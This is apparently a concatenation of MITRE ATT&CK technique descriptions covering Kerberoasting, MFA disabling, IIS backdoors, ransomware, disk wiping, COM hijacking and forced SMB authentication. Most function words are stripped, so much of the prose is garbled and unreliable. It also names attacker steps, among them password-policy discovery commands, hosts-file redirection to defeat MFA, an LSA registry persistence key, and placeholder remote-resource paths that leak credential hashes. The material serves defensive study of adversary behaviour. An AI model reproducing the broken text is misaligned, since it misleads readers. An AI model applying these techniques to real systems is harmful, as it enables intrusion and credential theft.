In addition management services, adversaries "target single sign-on (SSO) cloud-based applications utilizing federated authentication protocols," externally facing email applications, Office 365.(Citation: US-CERT TA18-068A 2018) Service principal names (SPNs) uniquely identify instance Windows service. enable authentication, Kerberos requires SPNs service logon account (an account tasked running service (Citation: Detecting Kerberoasting Feb 2018)). (Citation: SPN) (Citation: SetSPN) (Citation: SANS Attacking Kerberos Nov 2014) (Citation: Harmj0y Kerberoast Nov 2016)

Adversaries possessing valid Kerberos ticket-granting ticket (TGT) request Kerberos ticket-granting service (TGS) service tickets SPN domain controller (DC). (Citation: Empire InvokeKerberoast Oct 2016) (Citation: AdSecurity Cracking Kerberos Dec 2015) Portions tickets encrypted RC4 algorithm, meaning Kerberos 5 TGS-REP etype 23 hash service account SPN private key vulnerable offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks expose plaintext credentials. (Citation: AdSecurity Cracking Kerberos Dec 2015) (Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)

This attack executed service tickets captured network traffic. (Citation: AdSecurity Cracking Kerberos Dec 2015)

Cracked hashes enable Persistence, Privilege Escalation,  Lateral Movement access [Valid Accounts](https://attack.mitre.org/techniques/T1078). (Citation: SANS Attacking Kerberos Nov 2014) Adversaries attempt executable file difficult discover analyze encrypting, encoding, obfuscating contents transit. common behavior platforms network evade defenses. 

Payloads compressed, archived, encrypted avoid detection. payloads Initial Access mitigate detection. user's action required [Deobfuscate/Decode Files Information](https://attack.mitre.org/techniques/T1140) [User Execution](https://attack.mitre.org/techniques/T1204). user required input password password protected compressed/encrypted file adversary. (Citation: Volexity PowerDuke November 2016) Adversaries compressed archived scripts, JavaScript. 

Portions files encoded hide plain-text strings defenders discovery. (Citation: Linux/Cdorked.A Live Security Analysis) Payloads split separate, seemingly benign files reveal malicious functionality reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries obfuscate commands executed payloads [Command Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, platform/language specific semantics evade signature based detections application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)  Adversaries disable modify multi-factor authentication (MFA) mechanisms enable persistent access compromised accounts.

Once adversaries gained access network compromising account lacking MFA employing MFA bypass method [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621), adversaries leverage access modify completely disable MFA defenses. accomplished abusing legitimate features, excluding users Azure Conditional Access Policies, registering vulnerable/adversary-controlled MFA method, manually patching MFA programs configuration files bypass expected functionality.(Citation: Mandiant APT42)(Citation: Azure Conditional Access Exclusions)

For example, modifying Windows hosts file (`C:\windows\system32\drivers\etc\hosts`) redirect MFA calls localhost MFA server MFA process fail. "fail open" policy place, successful authentication attempt granted access enforcing MFA. (Citation: Russians Exploit Default MFA Protocol - CISA March 2022) 

Depending scope, goals, privileges adversary, MFA defenses disabled individual accounts accounts tied larger group, domain accounts victim's network environment.(Citation: Russians Exploit Default MFA Protocol - CISA March 2022)  Adversaries target Exchange server, Office 365, Google Workspace collect sensitive information. Adversaries leverage user's credentials interact Exchange server acquire network. Adversaries access externally facing Exchange services, Office 365, Google Workspace access email credentials access tokens. Tools [MailSniper](https://attack.mitre.org/software/S0413) automate searches specific keywords. Adversaries install malicious components Internet Services (IIS) servers establish persistence. IIS mechanisms extend functionality servers. example, Internet Server Application Programming Interface (ISAPI) extensions filters installed examine modify incoming outgoing IIS requests. Extensions filters deployed DLL files export functions: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules installed extend IIS servers.(Citation: ISAPI Extension Overview 2017)(Citation: ISAPI Filter Overview 2017)(Citation: IIS Backdoor 2011)(Citation: Trustwave IIS Module 2013)

Adversaries install malicious ISAPI extensions filters observe modify traffic, execute commands compromised machines, proxy command control traffic. ISAPI extensions filters access IIS requests responses. example, adversary abuse mechanisms modify responses distribute malicious commands/content comprised hosts.(Citation: ISAPI Filter Overview 2017)(Citation: ISAPI Extension Overview 2017)(Citation: ISAPI Extension Incoming 2017)(Citation: Dell TG-3390)(Citation: Trustwave IIS Module 2013)(Citation: MMPC ISAPI Filter 2012)

Adversaries install malicious IIS modules observe modify traffic. IIS 7.0 introduced modules provide unrestricted access requests responses ISAPI extensions filters. IIS modules written DLL exports <code>RegisterModule</code>, .NET application interfaces ASP.NET APIs access IIS requests.(Citation: IIS Modules Overview 2007)(Citation: Trustwave IIS Module 2013)(Citation: ESET IIS Malware 2021) Adversaries attempt mimic features valid code signatures increase chance deceiving user, analyst, tool. Code signing level authenticity binary developer guarantee binary tampered with. Adversaries metadata signature signed program, template unsigned program. Files invalid code signatures fail digital signature validation checks, legitimate users security tools improperly handle files.(Citation: Threatexpress MetaTwin 2017)

Unlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), activity result valid signature. Adversaries carry malicious operations virtual instance avoid detection. wide variety virtualization technologies exist emulation computing environment. running malicious code virtual instance, adversaries hide artifacts behavior security tools unable monitor activity virtual instance. Additionally, depending virtual networking implementation (ex: bridged adapter), network traffic generated virtual instance difficult trace compromised host IP address hostname match values.(Citation: SingHealth Breach Jan 2019)

Adversaries utilize native support virtualization (ex: Hyper-V) drop files virtual instance (ex: VirtualBox binaries). running virtual instance, adversaries create shared folder guest host permissions enable virtual instance interact host file system.(Citation: Sophos Ragnar 2020) <code>trap</code> command programs shells commands executed receiving interrupt signals. common situation script allowing graceful termination handling common  keyboard interrupts <code>ctrl+c</code> <code>ctrl+d</code>. Adversaries register code executed encounters specific interrupts gain execution persistence mechanism. Trap commands format <code>trap 'command list' signals</code> "command list" executed "signals" received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements) Adversaries attempt access detailed password policy enterprise network cloud environment. Password policies enforce complex passwords difficult guess crack [Brute Force](https://attack.mitre.org/techniques/T1110). adversary create list common passwords launch dictionary brute force attacks adheres policy (e.g. minimum password 8, passwords 'pass123'; checking 3-4 passwords account lockout set 6 lock accounts).

Password policies set discovered Windows, Linux, macOS systems command utilities <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, <code>pwpolicy getaccountpolicies</code> (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies). Adversaries leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) network devices discover password policy (e.g. <code>show aaa</code>, <code>show aaa common-criteria policy all</code>).(Citation: US-CERT-TA18-106A)

Password policies discovered cloud environments APIs <code>GetAccountPasswordPolicy</code> AWS (Citation: AWS GetPasswordPolicy). Adversaries establish persistence elevate privileges mechanisms trigger execution based specific events. operating systems monitor subscribe events logons user activity running specific applications/binaries. Cloud environments support functions services monitor invoked response specific cloud events.(Citation: Backdooring AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: DART Report 001)

Adversaries abuse mechanisms maintaining persistent access victim repeatedly executing malicious code. gaining access victim system, adversaries create/modify event triggers malicious content executed event trigger invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence OS X)(Citation: amnesia malware)

Since execution proxied account permissions, service accounts, adversary abuse triggered execution mechanisms escalate privileges.  Adversaries establish persistence executing malicious commands triggered user’s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute configuration scripts session based events. example, user command-line interface remotely logs (such SSH) login initiated. login executes scripts (<code>/etc</code>) user’s directory (<code>~/</code>) configure environment. login shells /etc/profile initiated. configuration scripts permission level directory set environment variables, create aliases, customize user’s environment. exits terminates, additional scripts executed ensure exits appropriately. 

Adversaries attempt establish persistence inserting commands scripts automatically executed shells. bash example, default GNU/Linux systems, adversaries add commands launch malicious binaries <code>/etc/profile</code> <code>/etc/profile.d</code> files.(Citation: intezer-kaiji-malware)(Citation: bencane blog bashrc) files typically require root permissions modify executed time launches. user level permissions, adversaries insert malicious commands <code>~/.bash_profile</code>, <code>~/.bash_login</code>, <code>~/.profile</code> sourced user command-line interface connects remotely.(Citation: anomali-rocke-tactics)(Citation: Linux manual bash invocation) executes existing file listed order, adversaries <code>~/.bash_profile</code> ensure execution. Adversaries leveraged <code>~/.bashrc</code> file additionally executed connection established remotely additional interactive opened, tab command-line interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation: Magento) malware targets termination program trigger execution, adversaries <code>~/.bash_logout</code> file execute malicious commands session. 

For macOS, functionality technique leverage zsh, default macOS 10.15+. Terminal.app opened, application launches zsh login zsh interactive shell. login configures environment <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, <code>/etc/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation: code_persistence_zsh)(Citation: macOS office sandbox escape) login configures user environment <code>~/.zprofile</code> <code>~/.zlogin</code>. interactive <code>~/.zshrc</code> configure user environment. exiting, <code>/etc/zlogout</code> <code>~/.zlogout</code> executed. legacy programs, macOS executes <code>/etc/bashrc</code> startup. Adversaries gather credential material invoking forcing user automatically provide authentication mechanism intercept.

The Server Message Block (SMB) protocol commonly Windows networks authentication communication systems access resources file sharing. Windows attempts connect SMB resource automatically attempt authenticate send credential current user remote system. (Citation: Wikipedia Server Message Block) behavior typical enterprise environments users enter credentials access network resources.

Web Distributed Authoring Versioning (WebDAV) typically Windows systems backup protocol SMB blocked fails. WebDAV extension typically operate TCP ports 80 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Managing WebDAV Security)

Adversaries advantage behavior gain access user account hashes forced SMB/WebDAV authentication. adversary send attachment user spearphishing resource link external server controlled adversary [Template Injection](https://attack.mitre.org/techniques/T1221)), specially crafted file navigation path privileged accounts (e.g. .SCF file desktop) publicly accessible share accessed victim(s). user's accesses untrusted resource attempt authentication send information, including user's hashed credentials, SMB adversary controlled server. (Citation: GitHub Hashjacking) access credential hash, adversary perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking gain access plaintext credentials. (Citation: Cylance Redirect SMB)

There occur. (Citation: Osanda Stealing NetNTLM Hashes) specifics in-the-wild include:

* spearphishing attachment document resource automatically loaded document [Template Injection](https://attack.mitre.org/techniques/T1221)). document include, example, request <code>file[:]//[remote address]/Normal.dotm</code> trigger SMB request. (Citation: US-CERT APT Energy Oct 2017)
* modified .LNK .SCF file icon filename external reference <code>\\[remote address]\pic.png</code> force load resource icon rendered repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017) Adversaries SID-History Injection escalate privileges bypass access controls. Windows security identifier (SID) unique identifies user account. SIDs Windows security security descriptors access tokens. (Citation: SID) account hold additional SIDs SID-History Active Directory attribute (Citation: SID-History Attribute), allowing inter-operable account migration domains values SID-History included access tokens).

With Domain Administrator (or equivalent) rights, harvested well-known SID values (Citation: SIDs Jun 2017) inserted SID-History enable impersonation arbitrary users/groups Enterprise Administrators. manipulation result elevated access local resources access inaccessible domains lateral movement techniques [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006). Adversaries bridge network boundaries compromising perimeter network devices internal devices responsible network segmentation. Breaching devices enable adversary bypass restrictions traffic routing separate trusted untrusted networks.

Devices routers firewalls create boundaries trusted untrusted networks.  achieve restricting traffic types enforce organizational policy attempt reduce risk inherent connections.  Restriction traffic achieved prohibiting IP addresses, layer 4 protocol ports, deep packet inspection identify applications.  participate rest network, devices addressable transparent, mode operation bearing adversary bypass compromised.

When adversary takes control boundary device, bypass policy enforcement pass prohibited traffic trust boundary separated networks hinderance.  achieving sufficient rights device, adversary reconfigure device traffic want, allowing achieve goals command control [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) exfiltration data [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries target internal devices responsible network segmentation abuse conjunction [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) achieve goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  border device separates separate organizations, adversary facilitate lateral movement victim environments. Adversaries encrypt data target systems systems network interrupt availability network resources. attempt render stored data inaccessible encrypting files data local remote drives withholding access decryption key. extract monetary compensation victim exchange decryption decryption key (ransomware) render data permanently inaccessible key saved transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)

In ransomware, typical common user files Office documents, PDFs, images, videos, audio, text, source code files encrypted (and renamed tagged specific file markers). Adversaries employ behaviors, [File Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), unlock gain access manipulate files.(Citation: CarbonBlack Conti July 2020) cases, adversaries encrypt critical files, disk partitions, MBR.(Citation: US-CERT NotPetya 2017) 

To maximize impact target organization, malware designed encrypting data worm-like features propagate network leveraging attack techniques [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), changing victim wallpapers, intimidate victims sending ransom notes messages connected printers (known "print bombing").(Citation: NHS Digital Egregor Nov 2020)

In cloud environments, storage objects compromised accounts encrypted.(Citation: Rhino S3 Ransomware 1) Adversaries erase contents storage devices specific systems systems network interrupt availability network resources.

Adversaries partially completely overwrite contents storage device rendering data irrecoverable storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) wiping specific disk structures files, adversaries destructive intent wipe arbitrary portions disk content. wipe disk content, adversaries acquire direct access hard drive overwrite arbitrarily sized portions disk random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries observed leveraging third-party drivers [RawDisk](https://attack.mitre.org/software/S0364) access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) behavior distinct [Data Destruction](https://attack.mitre.org/techniques/T1485) sections disk erased individual files.

To maximize impact target organization operations network-wide availability interruption goal, malware wiping disk content worm-like features propagate network leveraging additional techniques [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Windows Admin Shares](https://attack.mitre.org/techniques/T1077).(Citation: Novetta Blockbuster Destructive Malware) Adversaries undermine security controls warn users untrusted activity prevent execution untrusted programs. Operating systems security products mechanisms identify programs websites possessing level trust. Examples features include program allowed signed valid code signing certificate, program prompting user warning attribute set downloaded Internet, indication connect untrusted site.

Adversaries attempt subvert trust mechanisms. method adversaries depend specific mechanism seek subvert. Adversaries conduct [File Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) [Modify Registry](https://attack.mitre.org/techniques/T1112) support subverting controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries create steal code signing certificates acquire trust target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates)  Adversaries leverage <code>AuthorizationExecuteWithPrivileges</code> API escalate privileges prompting user credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) purpose API application developers easy perform operations root privileges, application installation updating. API validate program requesting root privileges reputable source maliciously modified. 

Although API deprecated, functions releases macOS. calling API, user prompted enter credentials checks origin integrity program made. program calling API load writable files modified perform malicious behavior elevated privileges.

Adversaries abuse <code>AuthorizationExecuteWithPrivileges</code> root privileges install malicious software victims install persistence mechanisms.(Citation: Death 1000 installers; broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) technique combined [Masquerading](https://attack.mitre.org/techniques/T1036) trick user granting escalated privileges malicious code.(Citation: Death 1000 installers; broken!)(Citation: Carbon Black Shlayer Feb 2019) technique modifying legitimate programs machine API.(Citation: Death 1000 installers; broken!) Adversaries gather victim's host firmware targeting. host firmware include variety details type versions specific hosts, infer hosts environment (ex: configuration, purpose, age/patch level, etc.).

Adversaries gather ways, direct elicitation [Phishing Information](https://attack.mitre.org/techniques/T1598). host firmware exposed adversaries online accessible data sets (ex: job postings, network maps, assessment reports, resumes, purchase invoices).(Citation: ArsTechnica Intel) Gathering reveal opportunities forms reconnaissance (ex: [Search Websites/Domains](https://attack.mitre.org/techniques/T1593) [Search Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)). Adversaries employ encryption algorithm conceal command control traffic relying inherent protections communication protocol. secure algorithm, implementations vulnerable reverse engineering secret encoded generated malware samples/configuration files. Windows password filters password policy enforcement mechanisms domain local accounts. Filters implemented dynamic link libraries (DLLs) method validate potential passwords password policies. Filter DLLs positioned local computers local accounts domain controllers domain accounts.

Before registering passwords Security Accounts Manager (SAM), Local Security Authority (LSA) requests validation registered filter. potential registered filter acknowledges validation.

Adversaries register malicious password filters harvest credentials local computers entire domains. perform proper validation, filters receive plain-text credentials LSA. malicious password filter receive plain-text credentials time password request made. (Citation: Carnal Ownage Password Filters Sept 2013) Adversaries abuse authentication packages execute DLLs boots. Windows authentication package DLLs loaded Local Security Authority (LSA) process start. provide support multiple logon processes multiple security protocols operating system.(Citation: MSDN Authentication Packages)

Adversaries autostart mechanism LSA authentication packages persistence placing reference binary Windows Registry location <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\</code> key <code>"Authentication Packages"=&lt;target binary&gt;</code>. binary executed authentication packages loaded. Adversaries abuse Regsvr32.exe proxy execution malicious code. Regsvr32.exe command-line program register unregister object linking embedding controls, including dynamic link libraries (DLLs), Windows systems. Regsvr32.exe binary signed Microsoft. (Citation: Regsvr32)

Malicious usage Regsvr32.exe avoid triggering security tools monitor execution of, modules loaded by, regsvr32.exe process allowlists false positives Windows regsvr32.exe normal operations. Regsvr32.exe bypass application control functionality load scriptlets execute DLLs user permissions. Regsvr32.exe network proxy aware, scripts loaded passing uniform resource locator (URL) file external server argument invocation. method Registry object registered, executed. (Citation: LOLBAS Regsvr32) variation technique referred "Squiblydoo" campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

Regsvr32.exe leveraged register Object establish persistence [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016) adversary compress data sensitive documents) collected prior exfiltration portable minimize data network. compression separately exfiltration channel performed custom program algorithm, common compression library utility 7zip, RAR, ZIP, zlib. Adversaries search local file systems remote file shares files passwords. files created users store credentials, shared credential stores individuals, configuration files passwords service, source code/binary files embedded passwords.

It extract passwords backups saved virtual machines [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: 2014) Passwords Policy Preferences stored Windows Domain Controller. (Citation: SRD GPP)

In cloud environments, authenticated user credentials stored local configuration credential files. cases, files copied reused machine contents read authenticate files. (Citation: Specter Ops - Cloud Credential Storage)

 Adversaries gather victim's host software targeting. installed software include variety details types versions specific hosts, presence additional components indicative defensive protections (ex: antivirus, SIEMs, etc.).

Adversaries gather ways, direct collection actions [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) [Phishing Information](https://attack.mitre.org/techniques/T1598). Adversaries compromise sites include malicious content designed collect host visitors.(Citation: ATT ScanBox) installed software exposed adversaries online accessible data sets (ex: job postings, network maps, assessment reports, resumes, purchase invoices). Gathering reveal opportunities forms reconnaissance (ex: [Search Websites/Domains](https://attack.mitre.org/techniques/T1593) [Search Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) [External Remote Services](https://attack.mitre.org/techniques/T1133)). Netsh.exe (also referred Netshell) command-line scripting utility interact network configuration system. functionality add helper DLLs extending functionality utility. (Citation: TechNet Netsh) paths registered netsh.exe helper DLLs entered Windows Registry <code>HKLM\SOFTWARE\Microsoft\Netsh</code>.

Adversaries netsh.exe helper DLLs proxy execution arbitrary code persistent manner netsh.exe executed automatically Persistence technique persistent software executes netsh.exe normal functionality. Examples include VPN software invoke netsh.exe. (Citation: Demaske Netsh Persistence)

Proof concept code exists load Cobalt Strike's payload netsh.exe helper DLLs. (Citation: Github Netsh Helper Beacon) Adversaries methods capturing user input credentials collect information. normal usage, users provide credentials locations, login pages/portals dialog boxes. Input capture mechanisms transparent user (e.g. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)) rely deceiving user providing input genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)). Adversaries develop exploits targeting. exploit takes advantage bug vulnerability unintended unanticipated behavior occur hardware software. finding/modifying exploits online purchasing exploit vendors, adversary develop exploits.(Citation: NYTStuxnet) Adversaries acquired [Vulnerabilities](https://attack.mitre.org/techniques/T1588/006) focus exploit development efforts. exploit development process, adversaries uncover exploitable vulnerabilities methods fuzzing patch analysis.(Citation: Irongeek Sims BSides 2017)

As legitimate development efforts, skill sets required developing exploits. skills located in-house, contracted out. contractor considered extension adversary's exploit development capabilities, adversary plays role shaping requirements maintains initial degree exclusivity exploit.

Adversaries exploits phases adversary lifecycle [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation Remote Services](https://attack.mitre.org/techniques/T1210), [Application Exploitation](https://attack.mitre.org/techniques/T1499/004)). Adversaries search social media victims targeting. Social media sites victim organization, business announcements roles, locations, staff.

Adversaries search social media sites depending seek gather. Threat actors passively harvest data sites, gathered create fake profiles/groups elicit victim’s revealing specific [Spearphishing Service](https://attack.mitre.org/techniques/T1598/001)).(Citation: Cyware Social Media) sources reveal opportunities forms reconnaissance (ex: [Phishing Information](https://attack.mitre.org/techniques/T1598) [Search Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), initial access (ex: [Spearphishing Service](https://attack.mitre.org/techniques/T1566/003)). Adversaries establish persistence executing malicious content triggered hijacked references Component Object Model (COM) objects. Windows enable interaction software components operating system.(Citation: Component Object Model)  References objects stored Registry. 

Adversaries insert malicious code executed legitimate software hijacking references relationships persistence. Hijacking object requires change Registry replace reference legitimate component component executed. component executed normal operation adversary's code executed instead.(Citation: GDATA Hijacking) adversary hijack objects frequently maintain consistent level persistence, break noticeable functionality avoid instability lead detection.  Adversaries gather credentials targeting. Account credentials gathered adversaries target victim organization attempt advantage tendency users passwords personal business accounts.

Adversaries gather credentials potential victims ways, direct elicitation [Phishing Information](https://attack.mitre.org/techniques/T1598). Adversaries compromise sites include malicious content designed collect authentication cookies visitors.(Citation: ATT ScanBox) Credential exposed adversaries leaks online accessible data sets (ex: [Search Engines](https://attack.mitre.org/techniques/T1593/002), breach dumps, code repositories, etc.).(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks) Adversaries purchase credentials dark black-markets. Gathering reveal opportunities forms reconnaissance (ex: [Search Websites/Domains](https://attack.mitre.org/techniques/T1593) [Phishing Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) [Valid Accounts](https://attack.mitre.org/techniques/T1078)). Adversaries manipulate application software prior receipt final consumer purpose data compromise. Supply chain compromise software ways, including manipulation application source code, manipulation update/distribution mechanism software, replacing compiled releases modified version.

Targeting specific desired victim set distributed broad set consumers additional tactics specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command 2011)   Adversaries rename legitimate utilities evade security mechanisms usage utilities. Security monitoring control mechanisms utilities adversaries capable abusing. (Citation: LOLBAS Main Site) bypass security mechanisms renaming utility prior utilization (ex: rename <code>rundll32.exe</code>). (Citation: Elastic Masquerade Ball) alternative occurs legitimate utility copied moved directory renamed avoid detections based utilities executing non-standard paths. (Citation: F-Secure CozyDuke) Adversaries existing, legitimate external service sending commands receiving output compromised service channel. Compromised systems leverage popular websites social media host command control (C2) instructions. infected systems send output commands service channel. return traffic occur variety ways, depending service utilized. example, return traffic form compromised posting comment forum, issuing pull request development project, updating document hosted service, sending Tweet. 

Popular websites social media acting mechanism C2 cover likelihood hosts network communicating prior compromise. common services, offered Google Twitter, easier adversaries hide expected noise. service providers commonly SSL/TLS encryption, adversaries level protection.  Adversaries exploit software vulnerabilities client applications execute code. Vulnerabilities exist software unsecure coding practices lead unanticipated behavior. Adversaries advantage vulnerabilities targeted exploitation purpose arbitrary code execution. Oftentimes valuable exploits offensive toolkit code execution remote gain access system. Users expect files applications commonly work, target exploit development utility.

Several types exist:

### Browser-based Exploitation

Web browsers common target [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems compromised normal browsing users targeted links spearphishing emails adversary controlled sites exploit browser. require action user exploit executed.

### Office Applications

Common office productivity applications Office targeted [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files transmitted attachments links download them. require user document file exploit run.

### Common Third-party Applications

Other applications commonly software deployed target network exploitation. Applications Adobe Reader Flash, common enterprise environments, routinely targeted adversaries attempting gain access systems. Depending software nature vulnerability, exploited browser require user file. instance, Flash exploits delivered objects Office documents. Adversaries iteratively probe infrastructure brute-forcing crawling techniques. technique employs methods [Brute Force](https://attack.mitre.org/techniques/T1110), goal identification content infrastructure discovery valid credentials. Wordlists scans generic, commonly names file extensions terms specific software. Adversaries create custom, target-specific wordlists data gathered Reconnaissance techniques (ex: [Gather Victim Information](https://attack.mitre.org/techniques/T1591), [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).

For example, adversaries content discovery tools Dirb, DirBuster, GoBuster generic custom wordlists enumerate website’s directories.(Citation: ClearSky Lebanese Cedar Jan 2021) discover old, vulnerable hidden administrative portals target operations (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) [Brute Force](https://attack.mitre.org/techniques/T1110)).  

As cloud storage solutions typically globally unique names, adversaries target-specific wordlists tools s3recon GCPBucketBrute enumerate public private buckets cloud infrastructure.(Citation: S3Recon GitHub)(Citation: GCPBucketBrute) storage objects discovered, adversaries leverage [Data Cloud Storage](https://attack.mitre.org/techniques/T1530) access valuable exfiltrated escalate privileges laterally.  Adversaries abuse Outlook's feature persistence compromised system. Outlook legacy feature customize presentation Outlook folders. feature internal external URL loaded folder opened. malicious crafted execute code loaded Outlook Page.(Citation: SensePost Outlook Page)

Once malicious user’s mailbox, loaded Outlook started. Malicious execute Outlook folder loaded/reloaded.(Citation: SensePost Outlook Page)
 Adversaries employ asymmetric encryption algorithm conceal command control traffic relying inherent protections communication protocol. Asymmetric cryptography, public key cryptography, keypair party: public freely distributed, private. generated, sender encrypts data receiver’s public key receiver decrypts data private key. ensures intended recipient read encrypted data. Common public key encryption algorithms include RSA ElGamal.

For efficiency, protocols (including SSL/TLS) symmetric cryptography connection established, asymmetric cryptography establish transmit key. such, protocols classified [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002). Adversaries exfiltrate data cloud storage service primary command control channel. Cloud storage services storage, edit, retrieval data remote cloud storage server Internet.

Examples cloud storage services include Dropbox Google Docs. Exfiltration cloud storage services provide cover adversary hosts network communicating service.  Adversaries transfer tools files systems compromised environment. brought victim environment [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files copied stage adversary tools files operation. Adversaries files internal victim systems support lateral movement inherent file sharing protocols file sharing [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connected network shares authenticated connections [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation: Unit42 LockerGoga 2019)

Files transferred native tools victim system, scp, rsync, curl, sftp, [ftp](https://attack.mitre.org/software/S0095). Adversaries execute malicious payloads hijacking vulnerable file path references. Adversaries advantage paths lack surrounding quotations placing executable level directory path, Windows choose adversary's executable launch.

Service paths (Citation: CurrentControlSet Services) shortcut paths vulnerable path interception path spaces surrounded quotation marks <code>C:\unsafe path space\program.exe</code> vs. <code>"C:\safe path space\program.exe"</code>). (Citation: eliminate unquoted path) (stored Windows Registry keys) adversary executable level directory path, Windows resolve executable intended executable. example, path shortcut <code>C:\program files\myapp.exe</code>, adversary create program <code>C:\program.exe</code> intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)

This technique persistence executables called regular basis, privilege escalation intercepted executables started privileged process. Adversaries install SSL/TLS certificates targeting. SSL/TLS certificates files installed servers enable secure communications systems. Digital certificates include key, owner's identity, digital signature entity verified certificate's contents correct. signature valid, person examining certificate trusts signer, key communicate securely owner. Certificates uploaded server, server configured certificate enable encrypted communication it.(Citation: DigiCert Install SSL Cert)

Adversaries install SSL/TLS certificates operations, encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) lending credibility credential harvesting site. Installation digital certificates server types, including servers email servers. 

